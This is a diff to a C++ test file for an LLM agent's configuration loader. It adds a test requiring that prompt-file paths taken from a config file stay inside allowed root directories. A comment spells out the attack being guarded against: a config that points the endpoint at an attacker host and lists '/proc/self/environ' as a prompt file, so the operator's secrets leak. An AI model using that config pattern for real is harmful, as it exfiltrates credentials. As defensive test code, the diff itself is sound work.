@@ -961,11 +961,15 @@ TH_TEST(llmconfig_prompt_files_parses_and_rejects_bad_shapes) {
 	TH_CHECK(!c4.promptFiles);
 }
 
-/* 目录写进配置文件 → buildAgentConfig 加载成成品文本，分节按自然排序 */
+/* 目录写进配置文件 → buildAgentConfig 加载成成品文本，分节按自然排序。
+ * H2（2026-09-23）：配置文件来源的提示词路径必须落在允许的根之内，夹具在
+ * TempDir（CWD 之外），故须显式授予根——这也正是新逃生口 BOT4CJ_PROMPT_DIR 的用法。 */
 TH_TEST(agentconfig_prompt_pack_loaded_from_config_file) {
 	NoKeyEnv nokey;
 	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
 	TempDir tmp("ppcfg");
+	const std::string rootStr = tmp.path().string();
+	EnvVar promptDir{"BOT4CJ_PROMPT_DIR", rootStr.c_str()};
 	fs::path pack = tmp.path() / "pack";
 	/* 本文件的 writeFile 不建父目录，目录输入要先显式创建 */
 	fs::create_directories(pack);
@@ -1018,6 +1022,51 @@ TH_TEST(agentconfig_prompt_pack_bad_path_fails_at_config_time) {
 	std::string err;
 	TH_CHECK(!buildAgentConfig(o, out, err));
 	TH_CHECK(err.find("不存在") != std::string::npos);
+}
+
+/* H2（2026-09-23）：**配置文件来源**的提示词路径必须落在工作目录（或
+ * BOT4CJ_PROMPT_DIR 显式列的根）之内。动机：prompt_files 的内容会进系统提示词
+ * 并随首个请求发往同一份配置可控的 endpoint，而读取走 read() 循环（不依赖
+ * stat 长度）⇒ 一份落在 CWD 的 ./mybot.llm.json 写
+ * `{"endpoint":"<攻击者>","prompt_files":["/proc/self/environ"]}` 就能把操作者的
+ * 环境块（含密钥）整块外发。命令行 --prompt-file 是操作者本人授意，不受限。 */
+TH_TEST(agentconfig_prompt_files_from_config_must_be_within_allowed_roots) {
+	NoKeyEnv nokey;
+	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
+	EnvVar noPromptDir{"BOT4CJ_PROMPT_DIR", nullptr};	/* 起点确定：不受开发者环境干扰 */
+	TempDir tmp("ppscope");
+	fs::path pack = tmp.path() / "pack";
+	fs::create_directories(pack);
+	writeFile(pack / "a.md", "越界的提示词\n", fs::perms::owner_all);
+	fs::path cfg = tmp.path() / "llm.json";
+	writeFile(cfg, std::string("{\"prompt_files\":[\"") + pack.string() + "\"]}",
+		fs::perms::owner_all);
+
+	/* ① 越界（TempDir 在 CWD 之外）且没有显式根 → 配置组装期拒绝，报错给出出路 */
+	AgentModeConfig out;
+	std::string err;
+	TH_CHECK(!buildAgentConfig(baseOptions(cfg.string()), out, err));
+	TH_CHECK(err.find("根之外") != std::string::npos);
+	TH_CHECK(err.find(pack.string()) != std::string::npos);
+	TH_CHECK(err.find("--prompt-file") != std::string::npos);
+	TH_CHECK(err.find("BOT4CJ_PROMPT_DIR") != std::string::npos);
+
+	/* ② 同一份配置在显式授予根之后可用——逃生口只有启动者能设（配置文件写不了） */
+	const std::string rootStr = tmp.path().string();
+	EnvVar promptDir{"BOT4CJ_PROMPT_DIR", rootStr.c_str()};
+	AgentModeConfig ok;
+	std::string okErr;
+	TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), ok, okErr));
+	TH_CHECK(okErr.empty());
+	TH_CHECK(ok.promptPack.find("越界的提示词") != std::string::npos);
+
+	/* ③ 不存在的条目仍报「不存在」——越界判据不抢加载期的报错（否则拼写错误
+	 * 会被报成越界，排查方向直接被带偏） */
+	writeFile(cfg, R"({"prompt_files":["/nonexistent/prompts"]})", fs::perms::owner_all);
+	AgentModeConfig out3;
+	std::string err3;
+	TH_CHECK(!buildAgentConfig(baseOptions(cfg.string()), out3, err3));
+	TH_CHECK(err3.find("不存在") != std::string::npos);
 }
 
 /* 系统提示词：包追加在内置段落（结构/硬件/脚本清单/工作方式）之后 */
